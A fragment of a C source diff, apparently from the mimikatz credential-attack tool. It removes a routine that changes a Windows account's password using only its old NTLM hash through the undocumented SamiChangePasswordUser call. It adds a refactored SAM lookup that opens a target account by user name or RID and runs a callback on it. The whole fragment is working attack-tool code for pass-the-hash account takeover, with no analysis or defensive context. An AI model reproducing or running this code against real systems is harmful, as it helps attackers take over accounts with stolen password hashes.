-			status1 = kull_m_string_stringToHex(szPassword, newNtlm, sizeof(newNtlm)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
-			if(!NT_SUCCESS(status1))
-				PRINT_ERROR(L"Unable to convert \'%s\' to new NTLM hash (16 bytes)\n", szPassword);
-		}
-		else
-		{
-			kprintf(L"** No new credentials provided, will use the default one **\n");
-			status1 = STATUS_SUCCESS;
-		}
-
-		if(NT_SUCCESS(status0) && NT_SUCCESS(status1))
-		{
-			kprintf(L"OLD NTLM     : ");
-			kull_m_string_wprintf_hex(oldNtlm, sizeof(oldNtlm), 0);
-			kprintf(L"\nNEW NTLM     : ");
-			kull_m_string_wprintf_hex(newNtlm, sizeof(newNtlm), 0);
-			kprintf(L"\n\n");
-			status0 = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
-			if(NT_SUCCESS(status0))
-			{
-				do
-				{
-					status1 = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
-					if(NT_SUCCESS(status1) || status1 == STATUS_MORE_ENTRIES)
-					{
-						for(i = 0; i < domainCountRetourned; i++)
-						{
-							if(RtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &uBuiltin, TRUE))
-								continue;
-							kprintf(L"Domain name  : %wZ\n", &pEnumDomainBuffer[i].Name);
-							status0 = SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
-							if(NT_SUCCESS(status0))
-							{
-								kprintf(L"Domain SID   : ");
-								kull_m_string_displaySID(domainSid);
-								kprintf(L"\n");
-								status0 = SamOpenDomain(hServerHandle, DOMAIN_LOOKUP, domainSid, &hDomainHandle);
-								if(NT_SUCCESS(status0))
-								{
-									status0 = SamLookupNamesInDomain(hDomainHandle, 1, &userName, &pRid, &pUse);
-									if(NT_SUCCESS(status0))
-									{
-										kprintf(L"User RID     : %u\n", pRid[0]);
-										status0 = SamOpenUser(hDomainHandle, USER_CHANGE_PASSWORD, pRid[0], &hUserHandle);
-										if(NT_SUCCESS(status0))
-										{
-											status0 = SamiChangePasswordUser(hUserHandle, FALSE, emptyLM, emptyLM, TRUE, oldNtlm, newNtlm);
-											if(NT_SUCCESS(status0))
-												kprintf(L"\n>> Change password is a success!\n");
-											else if(status0 == STATUS_WRONG_PASSWORD)
-												PRINT_ERROR(L"Bad old NTLM hash or password!\n");
-											else if(status0 == STATUS_PASSWORD_RESTRICTION)
-												PRINT_ERROR(L"Bad new NTLM hash or password! (restriction)\n");
-											else PRINT_ERROR(L"SamiChangePasswordUser: %08x\n", status0);
-											SamCloseHandle(hUserHandle);
-										}
-										else PRINT_ERROR(L"SamOpenUser: %08x\n", status0);
-										SamFreeMemory(pRid);
-										SamFreeMemory(pUse);
-									}
-									else PRINT_ERROR(L"SamLookupNamesInDomain: %08x\n", status0);
-									SamCloseHandle(hDomainHandle);
-								}
-								else PRINT_ERROR(L"SamOpenDomain: %08x\n", status0);
-								SamFreeMemory(domainSid);
-							}
-							else PRINT_ERROR(L"SamLookupDomainInSamServer: %08x\n", status0);
-						}
-						SamFreeMemory(pEnumDomainBuffer);
-					}
-					else PRINT_ERROR(L"SamEnumerateDomainsInSamServer: %08x\n", status1);
-				}
-				while(status1 == STATUS_MORE_ENTRIES);
-				SamCloseHandle(hServerHandle);
-			}
-			else PRINT_ERROR(L"SamConnect: %08x\n", status0);
-		}
 	}
-	else PRINT_ERROR(L"Argument /user: is needed\n");
-	return STATUS_SUCCESS;
+	else if(isRid = kull_m_string_args_byName(argc, argv, L"rid", &szUser, NULL))
+	{
+		rid = wcstoul(szUser, NULL, 0);
+		kprintf(L"Target RID   : %u\n", rid);
+	}
+
+	if(isUser || isRid)
+	{
+		status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
+		if(NT_SUCCESS(status))
+		{
+			do
+			{
+				enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
+				if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
+				{
+					for(i = 0; i < domainCountRetourned; i++)
+					{
+						if(RtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &uBuiltin, TRUE))
+							continue;
+						kprintf(L"Domain name  : %wZ\n", &pEnumDomainBuffer[i].Name);
+						status = SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
+						if(NT_SUCCESS(status))
+						{
+							kprintf(L"Domain SID   : ");
+							kull_m_string_displaySID(domainSid);
+							kprintf(L"\n");
+							status = SamOpenDomain(hServerHandle, DOMAIN_LOOKUP, domainSid, &hDomainHandle);
+							if(NT_SUCCESS(status))
+							{
+								if(isUser)
+								{
+									isRid = FALSE;
+									pRid = NULL;
+									pUse = NULL;
+									status = SamLookupNamesInDomain(hDomainHandle, 1, &userName, &pRid, &pUse);
+									if(NT_SUCCESS(status))
+									{
+										rid = pRid[0];
+										isRid = TRUE;
+									}
+									else PRINT_ERROR(L"SamLookupNamesInDomain: %08x\n", status);
+								}
+
+								if(isRid)
+								{
+									kprintf(L"User RID     : %u\n", rid);
+									status = SamOpenUser(hDomainHandle, dwUserAccess, rid, &hUserHandle);
+									if(NT_SUCCESS(status))
+									{
+										status = callback(hUserHandle, pvArg);
+										SamCloseHandle(hUserHandle);
+									}
+									else PRINT_ERROR(L"SamOpenUser: %08x\n", status);
+								}
+								else PRINT_ERROR(L"No RID\n");
+
+								if(isUser)
+								{
+									if(pRid)
+										SamFreeMemory(pRid);
+									if(pUse)
+										SamFreeMemory(pUse);
+								}
+								SamCloseHandle(hDomainHandle);
+							}
+							else PRINT_ERROR(L"SamOpenDomain: %08x\n", status);
+							SamFreeMemory(domainSid);
+						}
+						else PRINT_ERROR(L"SamLookupDomainInSamServer: %08x\n", status);
+					}
+					SamFreeMemory(pEnumDomainBuffer);
+				}
+				else PRINT_ERROR(L"SamEnumerateDomainsInSamServer: %08x\n", enumDomainStatus);
+			}
+			while(enumDomainStatus == STATUS_MORE_ENTRIES);
+			SamCloseHandle(hServerHandle);
+		}
+		else PRINT_ERROR(L"SamConnect: %08x\n", status);
+	}
+	else PRINT_ERROR(L"/user or /rid is needed\n");
+	return status;
 }
 
 PCWCHAR PACKAGES_FLAGS[] = {
